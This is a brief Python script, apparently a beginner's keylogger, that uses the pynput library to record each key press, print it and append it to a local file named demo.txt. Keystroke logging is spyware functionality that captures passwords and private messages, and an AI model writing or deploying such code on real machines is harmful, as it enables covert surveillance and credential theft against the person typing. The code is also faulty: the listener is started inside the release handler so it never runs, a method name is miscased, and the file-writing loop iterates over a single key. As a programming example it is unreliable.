from  pynput.keyboard import Key, Listener
k=[]
def on_press(key):
    k.append(key)
    write_1(key)
    print(key)
    pass
def write_1(var):
    with open("demo.txt","a")  as f:
        for i in var:
            new_var = str(i).replace("'", '')
            f.write(new_var)
            f.write(" ")
def on_release(key):
    if key == key.esc:
        return False
    with Listener(on_press=on_press,on_release=on_release) as l:
        l.Join()
